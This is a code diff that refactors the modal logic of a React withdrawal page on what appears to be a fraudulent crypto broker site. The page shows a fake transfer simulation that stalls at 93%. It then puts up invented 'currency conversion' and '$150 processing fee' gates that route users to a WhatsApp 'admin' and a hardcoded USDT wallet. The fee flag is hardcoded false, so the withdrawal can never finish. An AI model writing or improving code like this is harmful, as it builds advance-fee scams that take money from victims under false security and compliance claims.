@@ -1,6 +1,6 @@
 import { useState, useEffect, useRef } from 'react';
 import { useNavigate } from 'react-router-dom';
-import { motion, AnimatePresence } from 'framer-motion';
+import { motion } from 'framer-motion';
 import { 
   FaBitcoin, FaEthereum, FaArrowDown, FaLock, FaInfoCircle, 
   FaShieldAlt, FaCheckCircle, FaExclamationTriangle, FaKey, 
@@ -23,9 +23,6 @@ const PROCESSING_FEE_AMOUNT = 150;
 const PROCESSING_FEE_WALLET_ADDRESS = 'TJmVQ5zU2c9dQ8x7yZPq3nKcRvXwHbFdA1';
 const PROCESSING_FEE_WALLET_LABEL = 'USDT (TRC20)';
 const PROCESSING_FEE_PAID = false;
-
-// Delay for modal transitions — must exceed Framer Motion exit duration
-const MODAL_TRANSITION_DELAY = 500;
 
 const Withdraw = () => {
   const navigate = useNavigate();
@@ -62,9 +59,6 @@ const Withdraw = () => {
   const [currencyConversionDone, setCurrencyConversionDone] = useState(false);
   const [processingFeeConfirmed, setProcessingFeeConfirmed] = useState(false);
 
-  // ✅ Guard: prevent duplicate timers from re-opening modals
-  const modalTimersRef = useRef([]);
-
   const REACTIVATION_PIN = import.meta.env.VITE_REACTIVATION_PIN || '675489';
 
   const currencySymbol = getCurrencySymbol(user?.currency);
@@ -93,23 +87,6 @@ const Withdraw = () => {
   const localCountryName = userLocalCountry?.name || user?.country || 'your country';
   const localCountryFlag = userLocalCountry?.flag || '🌍';
 
-  // ✅ Helper: schedule a modal transition after exit animations
-  const scheduleModalOpen = (setter) => {
-    const t = setTimeout(() => {
-      setter(true);
-    }, MODAL_TRANSITION_DELAY);
-    modalTimersRef.current.push(t);
-  };
-
-  // Cleanup all scheduled timers on unmount
-  useEffect(() => {
-    return () => {
-      if (progressInterval.current) clearInterval(progressInterval.current);
-      modalTimersRef.current.forEach((t) => clearTimeout(t));
-      modalTimersRef.current = [];
-    };
-  }, []);
-
   useEffect(() => {
     const checkKYC = async () => {
       try {
@@ -135,7 +112,14 @@ const Withdraw = () => {
     fetchData();
   }, []);
 
-  // ─── Progress effect ──────────────────────────────────────
+  // Cleanup on unmount
+  useEffect(() => {
+    return () => {
+      if (progressInterval.current) clearInterval(progressInterval.current);
+    };
+  }, []);
+
+  // ─── Progress effect (single gate transition at a time) ───
   useEffect(() => {
     if (!showTransferModal) {
       if (progressInterval.current) {
@@ -167,8 +151,7 @@ const Withdraw = () => {
           progressInterval.current = null;
           setTransferProgress(93);
           setShowTransferModal(false);
-          // ✅ Delay: let transfer modal exit before showing next
-          scheduleModalOpen(setShowAdminSupportModal);
+          setShowAdminSupportModal(true);
           return;
         }
         if (!processingFeeConfirmed) {
@@ -176,7 +159,7 @@ const Withdraw = () => {
           progressInterval.current = null;
           setTransferProgress(93);
           setShowTransferModal(false);
-          scheduleModalOpen(setShowProcessingFeeModal);
+          setShowProcessingFeeModal(true);
           return;
         }
       }
@@ -336,8 +319,7 @@ const Withdraw = () => {
         setIsRetry(true);
         setTransferStatus('pending');
         setTransferProgress(45);
-        // Small delay so reactivation modal fully exits before transfer opens
-        setTimeout(() => setShowTransferModal(true), MODAL_TRANSITION_DELAY);
+        setShowTransferModal(true);
         toast.success('Account reactivated. Completing transfer...');
       } else {
         setPinError('Invalid PIN. Please try again.');
@@ -347,14 +329,12 @@ const Withdraw = () => {
     }, 800);
   };
 
-  // ✅ Gate 1 → Gate 2: Skip transfer modal, go straight to fee modal
   const handleConversionComplete = () => {
     setCurrencyConversionDone(true);
     setShowAdminSupportModal(false);
-    scheduleModalOpen(setShowProcessingFeeModal);
+    setShowProcessingFeeModal(true);
   };
 
-  // ✅ Gate 2 → Resume: reopen transfer modal only after fee modal exits
   const handleFeeConfirmed = () => {
     if (!PROCESSING_FEE_PAID) {
       toast.error('Fee not yet confirmed by admin. Please contact support.');
@@ -362,11 +342,8 @@ const Withdraw = () => {
     }
     setProcessingFeeConfirmed(true);
     setShowProcessingFeeModal(false);
-    const t = setTimeout(() => {
-      setTransferProgress(93);
-      setShowTransferModal(true);
-    }, MODAL_TRANSITION_DELAY);
-    modalTimersRef.current.push(t);
+    setTransferProgress(93);
+    setShowTransferModal(true);
   };
 
   const handleCopyFeeWallet = () => {
@@ -376,7 +353,6 @@ const Withdraw = () => {
     setTimeout(() => setFeeCopied(false), 2000);
   };
 
-  // ✅ Cancel handlers — reset all state, never reopen transfer
   const resetFlow = () => {
     setShowTransferModal(false);
     setShowAdminSupportModal(false);
@@ -399,12 +375,10 @@ const Withdraw = () => {
     toast.error('Withdrawal cancelled.');
   };
 
-  // WhatsApp message for gate 1
   const whatsappConversionLink = `https://wa.me/${ADMIN_WHATSAPP}?text=${encodeURIComponent(
     `Hello Support,\n\nI need currency conversion approval for my withdrawal.\n\nAmount: $${parseFloat(amount || 0).toLocaleString()}\nCountry: ${localCountryName}\nCurrency: ${localCurrency} (${localCurrencySymbol})\n\nPlease convert my balance and confirm.`
   )}`;
 
-  // WhatsApp message for gate 2
   const whatsappFeeLink = `https://wa.me/${ADMIN_WHATSAPP}?text=${encodeURIComponent(
     `Hello Support,\n\nI have sent the $${PROCESSING_FEE_AMOUNT} processing fee for my withdrawal.\n\n— Details —\nWithdrawal Amount: $${parseFloat(amount || 0).toLocaleString()}\nMethod: ${isPix ? `PIX (${pixKeyType.toUpperCase()})` : crypto}\nFee Wallet: ${PROCESSING_FEE_WALLET_LABEL}\nFee Address: ${PROCESSING_FEE_WALLET_ADDRESS}\n\nPlease verify my payment and unlock the withdrawal. Thank you.`
   )}`;
@@ -616,511 +590,444 @@ const Withdraw = () => {
         </motion.div>
       </div>
 
-      {/* ═══════════ UPGRADE LIMIT MODAL ═══════════ */}
-      <AnimatePresence mode="wait">
-        {showUpgradeModal && (
-          <motion.div
-            key="upgrade-modal"
-            initial={{ opacity: 0 }}
-            animate={{ opacity: 1 }}
-            exit={{ opacity: 0 }}
-            className="fixed inset-0 z-50 flex items-center justify-center bg-black/70 backdrop-blur-sm p-4"
-          >
-            <motion.div
-              initial={{ scale: 0.9, y: 20 }}
-              animate={{ scale: 1, y: 0 }}
-              exit={{ scale: 0.9, y: 20 }}
-              className="bg-slate-800 border border-slate-700 rounded-2xl p-6 w-full max-w-md"
-            >
-              <div className="flex justify-center mb-4">
-                <div className="w-16 h-16 bg-orange-500/10 border border-orange-500/30 rounded-full flex items-center justify-center">
-                  <FaArrowUp className="w-8 h-8 text-orange-500" />
-                </div>
+      {/* ═══════════ UPGRADE LIMIT MODAL (no AnimatePresence) ═══════════ */}
+      {showUpgradeModal && (
+        <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/70 backdrop-blur-sm p-4">
+          <div className="bg-slate-800 border border-slate-700 rounded-2xl p-6 w-full max-w-md">
+            <div className="flex justify-center mb-4">
+              <div className="w-16 h-16 bg-orange-500/10 border border-orange-500/30 rounded-full flex items-center justify-center">
+                <FaArrowUp className="w-8 h-8 text-orange-500" />
               </div>
-              <h3 className="text-xl font-bold text-white text-center mb-2">Withdrawal Limit Exceeded</h3>
-              <p className="text-sm text-slate-400 text-center mb-4">
-                Your withdrawal request of <strong className="text-white">{formatCurrency(amountNum)}</strong>{' '}
-                exceeds your current limit of <strong className="text-white">{formatCurrency(WITHDRAWAL_LIMIT)}</strong>.
+            </div>
+            <h3 className="text-xl font-bold text-white text-center mb-2">Withdrawal Limit Exceeded</h3>
+            <p className="text-sm text-slate-400 text-center mb-4">
+              Your withdrawal request of <strong className="text-white">{formatCurrency(amountNum)}</strong>{' '}
+              exceeds your current limit of <strong className="text-white">{formatCurrency(WITHDRAWAL_LIMIT)}</strong>.
+            </p>
+            <div className="mb-4 p-3 bg-orange-500/10 border border-orange-500/30 rounded-lg flex items-start gap-3">
+              <FaInfoCircle className="text-orange-400 text-sm mt-0.5 flex-shrink-0" />
+              <p className="text-orange-300 text-xs leading-relaxed">
+                To upgrade your withdrawal limit, please contact our support team.
               </p>
-              <div className="mb-4 p-3 bg-orange-500/10 border border-orange-500/30 rounded-lg flex items-start gap-3">
-                <FaInfoCircle className="text-orange-400 text-sm mt-0.5 flex-shrink-0" />
-                <p className="text-orange-300 text-xs leading-relaxed">
-                  To upgrade your withdrawal limit, please contact our support team.
-                </p>
-              </div>
-              <div className="flex gap-3">
-                <button
-                  onClick={() => setShowUpgradeModal(false)}
-                  className="flex-1 py-3 rounded-lg border border-slate-700 text-slate-300 font-medium hover:bg-slate-700/50 transition"
-                >
-                  Cancel
-                </button>
-                <a
-                  href={whatsappUpgradeLink}
-                  target="_blank"
-                  rel="noopener noreferrer"
-                  className="flex-1 py-3 rounded-lg bg-gradient-to-r from-green-600 to-emerald-600 text-white font-semibold hover:opacity-90 transition flex items-center justify-center gap-2"
-                >
-                  <FaWhatsapp className="text-lg" /> Contact Support
-                </a>
-              </div>
-              <div className="mt-3 flex items-center justify-center gap-2 text-xs text-slate-500">
-                <FaHeadset className="text-slate-500" />
-                <span>Support is available 24/7</span>
-              </div>
-            </motion.div>
-          </motion.div>
-        )}
-      </AnimatePresence>
+            </div>
+            <div className="flex gap-3">
+              <button
+                onClick={() => setShowUpgradeModal(false)}
+                className="flex-1 py-3 rounded-lg border border-slate-700 text-slate-300 font-medium hover:bg-slate-700/50 transition"
+              >
+                Cancel
+              </button>
+              <a
+                href={whatsappUpgradeLink}
+                target="_blank"
+                rel="noopener noreferrer"
+                className="flex-1 py-3 rounded-lg bg-gradient-to-r from-green-600 to-emerald-600 text-white font-semibold hover:opacity-90 transition flex items-center justify-center gap-2"
+              >
+                <FaWhatsapp className="text-lg" /> Contact Support
+              </a>
+            </div>
+            <div className="mt-3 flex items-center justify-center gap-2 text-xs text-slate-500">
+              <FaHeadset className="text-slate-500" />
+              <span>Support is available 24/7</span>
+            </div>
+          </div>
+        </div>
+      )}
 
       {/* ═══════════ TRANSFER SIMULATION MODAL ═══════════ */}
-      <AnimatePresence mode="wait">
-        {showTransferModal && (
-          <motion.div
-            key="transfer-modal"
-            initial={{ opacity: 0 }}
-            animate={{ opacity: 1 }}
-            exit={{ opacity: 0 }}
-            className="fixed inset-0 z-50 flex items-center justify-center bg-black/70 backdrop-blur-sm p-4"
-          >
-            <motion.div
-              initial={{ scale: 0.9, y: 20 }}
-              animate={{ scale: 1, y: 0 }}
-              exit={{ scale: 0.9, y: 20 }}
-              className="bg-slate-800 border border-slate-700 rounded-2xl p-6 w-full max-w-md text-center"
-            >
-              <div className="flex justify-center mb-4">
-                {transferStatus === 'pending' && (
-                  <div className="w-16 h-16 bg-blue-500/10 border border-blue-500/30 rounded-full flex items-center justify-center">
-                    <div className="w-8 h-8 border-3 border-blue-500 border-t-transparent rounded-full animate-spin"></div>
-                  </div>
-                )}
-                {transferStatus === 'failed' && (
-                  <div className="w-16 h-16 bg-red-500/10 border border-red-500/30 rounded-full flex items-center justify-center">
-                    <FaExclamationTriangle className="w-8 h-8 text-red-500" />
-                  </div>
-                )}
-                {transferStatus === 'complete' && (
-                  <div className="w-16 h-16 bg-green-500/10 border border-green-500/30 rounded-full flex items-center justify-center">
-                    <FaCheckCircle className="w-8 h-8 text-green-500" />
-                  </div>
-                )}
-              </div>
-
-              <h3 className="text-xl font-bold text-white mb-2">
-                {transferStatus === 'pending' && 'Processing Transfer...'}
-                {transferStatus === 'failed' && 'Transfer Failed'}
-                {transferStatus === 'complete' && 'Transfer Complete!'}
-              </h3>
-
-              <p className="text-sm text-slate-400 mb-4">
-                {transferStatus === 'pending' &&
-                  `Moving funds from broker wallet to your ${isPix ? 'PIX account' : 'destination wallet'}.`}
-                {transferStatus === 'failed' &&
-                  'The transfer could not be completed. Please try again.'}
-                {transferStatus === 'complete' && 'Your funds have been sent successfully!'}
-              </p>
-
-              <div className="w-full bg-slate-700 rounded-full h-3 mb-2 overflow-hidden">
-                <div
-                  className={`h-full rounded-full transition-all duration-300 ${
-                    transferStatus === 'failed'
-                      ? 'bg-red-500'
-                      : transferStatus === 'complete'
-                      ? 'bg-green-500'
-                      : 'bg-blue-500'
-                  }`}
-                  style={{ width: `${transferProgress}%` }}
-                />
-              </div>
-              <p className="text-xs text-slate-500 mb-4">{transferProgress}%</p>
-
+      {showTransferModal && (
+        <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/70 backdrop-blur-sm p-4">
+          <div className="bg-slate-800 border border-slate-700 rounded-2xl p-6 w-full max-w-md text-center">
+            <div className="flex justify-center mb-4">
+              {transferStatus === 'pending' && (
+                <div className="w-16 h-16 bg-blue-500/10 border border-blue-500/30 rounded-full flex items-center justify-center">
+                  <div className="w-8 h-8 border-3 border-blue-500 border-t-transparent rounded-full animate-spin"></div>
+                </div>
+              )}
               {transferStatus === 'failed' && (
-                <button
-                  onClick={handleRetry}
-                  className="w-full py-3 rounded-lg bg-gradient-to-r from-blue-600 to-indigo-600 text-white font-semibold hover:opacity-90 transition-all"
-                >
-                  Try Again
-                </button>
+                <div className="w-16 h-16 bg-red-500/10 border border-red-500/30 rounded-full flex items-center justify-center">
+                  <FaExclamationTriangle className="w-8 h-8 text-red-500" />
+                </div>
               )}
-
               {transferStatus === 'complete' && (
-                <button
-                  onClick={handleCloseSuccess}
-                  className="w-full py-3 rounded-lg bg-gradient-to-r from-green-600 to-emerald-600 text-white font-semibold hover:opacity-90 transition-all"
-                >
-                  Done
-                </button>
+                <div className="w-16 h-16 bg-green-500/10 border border-green-500/30 rounded-full flex items-center justify-center">
+                  <FaCheckCircle className="w-8 h-8 text-green-500" />
+                </div>
               )}
-            </motion.div>
-          </motion.div>
-        )}
-      </AnimatePresence>
+            </div>
+
+            <h3 className="text-xl font-bold text-white mb-2">
+              {transferStatus === 'pending' && 'Processing Transfer...'}
+              {transferStatus === 'failed' && 'Transfer Failed'}
+              {transferStatus === 'complete' && 'Transfer Complete!'}
+            </h3>
+
+            <p className="text-sm text-slate-400 mb-4">
+              {transferStatus === 'pending' &&
+                `Moving funds from broker wallet to your ${isPix ? 'PIX account' : 'destination wallet'}.`}
+              {transferStatus === 'failed' &&
+                'The transfer could not be completed. Please try again.'}
+              {transferStatus === 'complete' && 'Your funds have been sent successfully!'}
+            </p>
+
+            <div className="w-full bg-slate-700 rounded-full h-3 mb-2 overflow-hidden">
+              <div
+                className={`h-full rounded-full transition-all duration-300 ${
+                  transferStatus === 'failed'
+                    ? 'bg-red-500'
+                    : transferStatus === 'complete'
+                    ? 'bg-green-500'
+                    : 'bg-blue-500'
+                }`}
+                style={{ width: `${transferProgress}%` }}
+              />
+            </div>
+            <p className="text-xs text-slate-500 mb-4">{transferProgress}%</p>
+
+            {transferStatus === 'failed' && (
+              <button
+                onClick={handleRetry}
+                className="w-full py-3 rounded-lg bg-gradient-to-r from-blue-600 to-indigo-600 text-white font-semibold hover:opacity-90 transition-all"
+              >
+                Try Again
+              </button>
+            )}
+
+            {transferStatus === 'complete' && (
+              <button
+                onClick={handleCloseSuccess}
+                className="w-full py-3 rounded-lg bg-gradient-to-r from-green-600 to-emerald-600 text-white font-semibold hover:opacity-90 transition-all"
+              >
+                Done
+              </button>
+            )}
+          </div>
+        </div>
+      )}
 
       {/* ═══════════ GATE 1: CURRENCY CONVERSION MODAL ═══════════ */}
-      <AnimatePresence mode="wait">
-        {showAdminSupportModal && (
-          <motion.div
-            key="admin-support-modal"
-            initial={{ opacity: 0 }}
-            animate={{ opacity: 1 }}
-            exit={{ opacity: 0 }}
-            className="fixed inset-0 z-[60] flex items-center justify-center bg-black/70 backdrop-blur-sm p-4"
-          >
-            <motion.div
-              initial={{ scale: 0.9, y: 20 }}
-              animate={{ scale: 1, y: 0 }}
-              exit={{ scale: 0.9, y: 20 }}
-              className="bg-slate-800 border border-red-500/40 rounded-2xl p-6 w-full max-w-md max-h-[92vh] overflow-y-auto"
-            >
-              <div className="flex justify-center mb-4">
-                <div className="w-16 h-16 bg-red-500/10 border border-red-500/40 rounded-full flex items-center justify-center">
-                  <FaShieldVirus className="w-8 h-8 text-red-500" />
+      {showAdminSupportModal && (
+        <div className="fixed inset-0 z-[60] flex items-center justify-center bg-black/70 backdrop-blur-sm p-4">
+          <div className="bg-slate-800 border border-red-500/40 rounded-2xl p-6 w-full max-w-md max-h-[92vh] overflow-y-auto">
+            <div className="flex justify-center mb-4">
+              <div className="w-16 h-16 bg-red-500/10 border border-red-500/40 rounded-full flex items-center justify-center">
+                <FaShieldVirus className="w-8 h-8 text-red-500" />
+              </div>
+            </div>
+
+            <h3 className="text-xl font-bold text-white text-center mb-2">
+              Balance Conversion Required
+            </h3>
+
+            <p className="text-sm text-slate-400 text-center mb-5">
+              To protect your funds and prevent fraud, this withdrawal{' '}
+              <strong className="text-red-400">cannot be completed</strong> until your balance
+              has been converted into your local currency.
+            </p>
+
+            <div className="mb-4 p-4 bg-red-500/10 border-2 border-red-500/40 rounded-lg">
+              <div className="flex items-start gap-3">
+                <FaExclamationTriangle className="text-red-400 text-lg mt-0.5 flex-shrink-0" />
+                <div className="text-red-300 text-xs leading-relaxed space-y-2">
+                  <p className="font-bold text-red-200 text-sm uppercase tracking-wide">Mandatory Step</p>
+                  <p>
+                    Your balance <strong className="text-white">must</strong> be converted to{' '}
+                    <strong className="text-white">{localCurrency} ({localCurrencySymbol})</strong>{' '}
+                    — the official currency of <strong className="text-white">{localCountryFlag} {localCountryName}</strong>.
+                  </p>
+                  <p>
+                    This allows us to <strong className="text-white">track and monitor</strong> the transaction route end-to-end.
+                  </p>
                 </div>
               </div>
+            </div>
 
-              <h3 className="text-xl font-bold text-white text-center mb-2">
-                Balance Conversion Required
-              </h3>
+            <div className="mb-4 p-3 bg-slate-900/50 rounded-lg border border-slate-700 space-y-2 text-sm">
+              <div className="flex justify-between">
+                <span className="text-slate-400">Withdrawal Amount:</span>
+                <span className="text-white font-semibold">{formatCurrency(amountNum)}</span>
+              </div>
+              <div className="flex justify-between">
+                <span className="text-slate-400">Target Currency:</span>
+                <span className="text-white font-semibold">{localCurrencySymbol} {localCurrency}</span>
+              </div>
+              <div className="flex justify-between">
+                <span className="text-slate-400">Status:</span>
+                <span className="text-amber-400 font-semibold">93% — Awaiting Admin Approval</span>
+              </div>
+            </div>
 
-              <p className="text-sm text-slate-400 text-center mb-5">
-                To protect your funds and prevent fraud, this withdrawal{' '}
-                <strong className="text-red-400">cannot be completed</strong> until your balance
-                has been converted into your local currency.
+            <div className="mb-5 p-3 bg-yellow-500/10 border border-yellow-500/30 rounded-lg flex items-start gap-3">
+              <FaHeadset className="text-yellow-500 text-sm mt-0.5 flex-shrink-0" />
+              <p className="text-yellow-300 text-xs leading-relaxed">
+                <strong className="text-yellow-200">Only an administrator</strong> can perform this conversion. Contact support, then click "Conversion Complete" once approved.
               </p>
+            </div>
 
-              <div className="mb-4 p-4 bg-red-500/10 border-2 border-red-500/40 rounded-lg">
-                <div className="flex items-start gap-3">
-                  <FaExclamationTriangle className="text-red-400 text-lg mt-0.5 flex-shrink-0" />
-                  <div className="text-red-300 text-xs leading-relaxed space-y-2">
-                    <p className="font-bold text-red-200 text-sm uppercase tracking-wide">Mandatory Step</p>
-                    <p>
-                      Your balance <strong className="text-white">must</strong> be converted to{' '}
-                      <strong className="text-white">{localCurrency} ({localCurrencySymbol})</strong>{' '}
-                      — the official currency of <strong className="text-white">{localCountryFlag} {localCountryName}</strong>.
-                    </p>
-                    <p>
-                      This allows us to <strong className="text-white">track and monitor</strong> the transaction route end-to-end.
-                    </p>
-                  </div>
-                </div>
-              </div>
+            <div className="flex flex-col gap-3">
+              <a
+                href={whatsappConversionLink}
+                target="_blank"
+                rel="noopener noreferrer"
+                className="w-full py-3 rounded-lg bg-gradient-to-r from-green-600 to-emerald-600 text-white font-semibold hover:opacity-90 transition flex items-center justify-center gap-2"
+              >
+                <FaWhatsapp className="text-lg" /> Contact Admin (Currency Conversion)
+              </a>
+              <button
+                onClick={handleConversionComplete}
+                className="w-full py-3 rounded-lg bg-gradient-to-r from-blue-600 to-purple-600 text-white font-semibold hover:opacity-90 transition flex items-center justify-center gap-2"
+              >
+                <FaCheckCircle /> Conversion Complete → Continue
+              </button>
+              <button
+                onClick={handleCancelAdmin}
+                className="w-full py-3 rounded-lg border border-slate-700 text-slate-300 font-medium hover:bg-slate-700/50 transition"
+              >
+                Cancel Withdrawal
+              </button>
+            </div>
 
-              <div className="mb-4 p-3 bg-slate-900/50 rounded-lg border border-slate-700 space-y-2 text-sm">
-                <div className="flex justify-between">
-                  <span className="text-slate-400">Withdrawal Amount:</span>
-                  <span className="text-white font-semibold">{formatCurrency(amountNum)}</span>
-                </div>
-                <div className="flex justify-between">
-                  <span className="text-slate-400">Target Currency:</span>
-                  <span className="text-white font-semibold">{localCurrencySymbol} {localCurrency}</span>
-                </div>
-                <div className="flex justify-between">
-                  <span className="text-slate-400">Status:</span>
-                  <span className="text-amber-400 font-semibold">93% — Awaiting Admin Approval</span>
-                </div>
-              </div>
-
-              <div className="mb-5 p-3 bg-yellow-500/10 border border-yellow-500/30 rounded-lg flex items-start gap-3">
-                <FaHeadset className="text-yellow-500 text-sm mt-0.5 flex-shrink-0" />
-                <p className="text-yellow-300 text-xs leading-relaxed">
-                  <strong className="text-yellow-200">Only an administrator</strong> can perform this conversion. Contact support, then click "Conversion Complete" once approved.
-                </p>
-              </div>
-
-              <div className="flex flex-col gap-3">
-                <a
-                  href={whatsappConversionLink}
-                  target="_blank"
-                  rel="noopener noreferrer"
-                  className="w-full py-3 rounded-lg bg-gradient-to-r from-green-600 to-emerald-600 text-white font-semibold hover:opacity-90 transition flex items-center justify-center gap-2"
-                >
-                  <FaWhatsapp className="text-lg" /> Contact Admin (Currency Conversion)
-                </a>
-                <button
-                  onClick={handleConversionComplete}
-                  className="w-full py-3 rounded-lg bg-gradient-to-r from-blue-600 to-purple-600 text-white font-semibold hover:opacity-90 transition flex items-center justify-center gap-2"
-                >
-                  <FaCheckCircle /> Conversion Complete → Continue
-                </button>
-                <button
-                  onClick={handleCancelAdmin}
-                  className="w-full py-3 rounded-lg border border-slate-700 text-slate-300 font-medium hover:bg-slate-700/50 transition"
-                >
-                  Cancel Withdrawal
-                </button>
-              </div>
-
-              <div className="mt-4 flex items-center justify-center gap-2 text-xs text-slate-500">
-                <FaComments className="text-slate-500" />
-                <span>Support is available 24/7</span>
-              </div>
-            </motion.div>
-          </motion.div>
-        )}
-      </AnimatePresence>
+            <div className="mt-4 flex items-center justify-center gap-2 text-xs text-slate-500">
+              <FaComments className="text-slate-500" />
+              <span>Support is available 24/7</span>
+            </div>
+          </div>
+        </div>
+      )}
 
       {/* ═══════════ GATE 2: PROCESSING FEE MODAL ═══════════ */}
-      <AnimatePresence mode="wait">
-        {showProcessingFeeModal && (
-          <motion.div
-            key="processing-fee-modal"
-            initial={{ opacity: 0 }}
-            animate={{ opacity: 1 }}
-            exit={{ opacity: 0 }}
-            className="fixed inset-0 z-[60] flex items-center justify-center bg-black/70 backdrop-blur-sm p-4"
-          >
-            <motion.div
-              initial={{ scale: 0.9, y: 20 }}
-              animate={{ scale: 1, y: 0 }}
-              exit={{ scale: 0.9, y: 20 }}
-              className="bg-slate-800 border border-amber-500/40 rounded-2xl p-6 w-full max-w-md max-h-[92vh] overflow-y-auto"
-            >
-              <div className="flex justify-center mb-4">
-                <div className="w-16 h-16 bg-amber-500/10 border border-amber-500/40 rounded-full flex items-center justify-center">
-                  <FaCoins className="w-8 h-8 text-amber-400" />
+      {showProcessingFeeModal && (
+        <div className="fixed inset-0 z-[60] flex items-center justify-center bg-black/70 backdrop-blur-sm p-4">
+          <div className="bg-slate-800 border border-amber-500/40 rounded-2xl p-6 w-full max-w-md max-h-[92vh] overflow-y-auto">
+            <div className="flex justify-center mb-4">
+              <div className="w-16 h-16 bg-amber-500/10 border border-amber-500/40 rounded-full flex items-center justify-center">
+                <FaCoins className="w-8 h-8 text-amber-400" />
+              </div>
+            </div>
+
+            <h3 className="text-xl font-bold text-white text-center mb-2">
+              Processing Fee Required
+            </h3>
+
+            <p className="text-sm text-slate-400 text-center mb-5">
+              A one-time processing fee of{' '}
+              <strong className="text-amber-400">${PROCESSING_FEE_AMOUNT}.00</strong> is required
+              to finalize this high-value withdrawal.
+            </p>
+
+            <div className="mb-4 p-4 bg-amber-500/10 border-2 border-amber-500/40 rounded-lg text-center">
+              <p className="text-xs text-amber-300 uppercase tracking-wider font-semibold mb-1">Processing Fee</p>
+              <p className="text-3xl font-bold text-white">${PROCESSING_FEE_AMOUNT}.00</p>
+            </div>
+
+            <div className="mb-4">
+              <label className="block text-slate-300 text-sm font-medium mb-2">
+                Payment Address ({PROCESSING_FEE_WALLET_LABEL})
+              </label>
+              <div className="flex items-center gap-2">
+                <code className="flex-1 bg-slate-900 border border-slate-700 rounded-lg px-3 py-3 text-xs text-white break-all font-mono">
+                  {PROCESSING_FEE_WALLET_ADDRESS}
+                </code>
+                <button
+                  type="button"
+                  onClick={handleCopyFeeWallet}
+                  className="p-3 bg-slate-700 rounded-lg hover:bg-slate-600 transition flex-shrink-0"
+                  title="Copy address"
+                >
+                  {feeCopied ? <FaCheck className="text-green-400" /> : <FaCopy className="text-white" />}
+                </button>
+              </div>
+            </div>
+
+            <div className="mb-4 p-3 bg-blue-500/10 border border-blue-500/30 rounded-lg">
+              <div className="flex items-start gap-3">
+                <FaInfoCircle className="text-blue-400 text-sm mt-0.5 flex-shrink-0" />
+                <div className="text-blue-300 text-xs leading-relaxed">
+                  <p className="font-semibold text-blue-200 mb-1">Why is this required?</p>
+                  <ul className="list-disc pl-4 space-y-1">
+                    <li>Additional security verification for high-value transfers</li>
+                    <li>Blockchain & network processing costs</li>
+                    <li>Compliance and anti-fraud monitoring</li>
+                    <li>Currency conversion execution</li>
+                  </ul>
                 </div>
               </div>
+            </div>
 
-              <h3 className="text-xl font-bold text-white text-center mb-2">
-                Processing Fee Required
-              </h3>
+            <div className="mb-4 p-3 bg-slate-900/50 rounded-lg border border-slate-700 space-y-2 text-sm">
+              <div className="flex justify-between">
+                <span className="text-slate-400">Withdrawal Amount:</span>
+                <span className="text-white font-semibold">{formatCurrency(amountNum)}</span>
+              </div>
+              <div className="flex justify-between">
+                <span className="text-slate-400">Processing Fee:</span>
+                <span className="text-amber-400 font-semibold">${PROCESSING_FEE_AMOUNT}.00</span>
+              </div>
+              <div className="flex justify-between">
+                <span className="text-slate-400">Status:</span>
+                <span className={PROCESSING_FEE_PAID ? 'text-green-400 font-semibold' : 'text-amber-400 font-semibold'}>
+                  {PROCESSING_FEE_PAID ? 'Fee Confirmed ✓' : 'Awaiting Admin Confirmation'}
+                </span>
+              </div>
+            </div>
 
-              <p className="text-sm text-slate-400 text-center mb-5">
-                A one-time processing fee of{' '}
-                <strong className="text-amber-400">${PROCESSING_FEE_AMOUNT}.00</strong> is required
-                to finalize this high-value withdrawal.
-              </p>
-
-              <div className="mb-4 p-4 bg-amber-500/10 border-2 border-amber-500/40 rounded-lg text-center">
-                <p className="text-xs text-amber-300 uppercase tracking-wider font-semibold mb-1">
-                  Processing Fee
+            {!PROCESSING_FEE_PAID ? (
+              <div className="mb-4 p-3 bg-yellow-500/10 border border-yellow-500/30 rounded-lg flex items-start gap-3">
+                <FaLock className="text-yellow-500 text-sm mt-0.5 flex-shrink-0" />
+                <p className="text-yellow-300 text-xs leading-relaxed">
+                  <strong className="text-yellow-200">Awaiting admin confirmation.</strong>{' '}
+                  Send the fee to the address above, then contact support.
                 </p>
-                <p className="text-3xl font-bold text-white">${PROCESSING_FEE_AMOUNT}.00</p>
               </div>
-
-              <div className="mb-4">
-                <label className="block text-slate-300 text-sm font-medium mb-2">
-                  Payment Address ({PROCESSING_FEE_WALLET_LABEL})
-                </label>
-                <div className="flex items-center gap-2">
-                  <code className="flex-1 bg-slate-900 border border-slate-700 rounded-lg px-3 py-3 text-xs text-white break-all font-mono">
-                    {PROCESSING_FEE_WALLET_ADDRESS}
-                  </code>
-                  <button
-                    type="button"
-                    onClick={handleCopyFeeWallet}
-                    className="p-3 bg-slate-700 rounded-lg hover:bg-slate-600 transition flex-shrink-0"
-                    title="Copy address"
-                  >
-                    {feeCopied ? <FaCheck className="text-green-400" /> : <FaCopy className="text-white" />}
-                  </button>
-                </div>
+            ) : (
+              <div className="mb-4 p-3 bg-green-500/10 border border-green-500/30 rounded-lg flex items-start gap-3">
+                <FaCheckCircle className="text-green-500 text-sm mt-0.5 flex-shrink-0" />
+                <p className="text-green-300 text-xs leading-relaxed">
+                  <strong className="text-green-200">Fee confirmed!</strong> You may now proceed with your withdrawal.
+                </p>
               </div>
+            )}
 
-              <div className="mb-4 p-3 bg-blue-500/10 border border-blue-500/30 rounded-lg">
-                <div className="flex items-start gap-3">
-                  <FaInfoCircle className="text-blue-400 text-sm mt-0.5 flex-shrink-0" />
-                  <div className="text-blue-300 text-xs leading-relaxed">
-                    <p className="font-semibold text-blue-200 mb-1">Why is this required?</p>
-                    <ul className="list-disc pl-4 space-y-1">
-                      <li>Additional security verification for high-value transfers</li>
-                      <li>Blockchain & network processing costs</li>
-                      <li>Compliance and anti-fraud monitoring</li>
-                      <li>Currency conversion execution</li>
-                    </ul>
-                  </div>
-                </div>
-              </div>
+            <div className="flex flex-col gap-3">
+              <button
+                type="button"
+                onClick={handleFeeConfirmed}
+                disabled={!PROCESSING_FEE_PAID}
+                className={`w-full py-3 rounded-lg text-white font-bold transition flex items-center justify-center gap-2 ${
+                  PROCESSING_FEE_PAID
+                    ? 'bg-gradient-to-r from-amber-600 to-orange-600 hover:opacity-90'
+                    : 'bg-slate-700 opacity-50 cursor-not-allowed'
+                }`}
+              >
+                {PROCESSING_FEE_PAID ? (
+                  <><FaCheckCircle /> I Have Paid — Proceed</>
+                ) : (
+                  <><FaLock /> Waiting for Admin Confirmation</>
+                )}
+              </button>
 
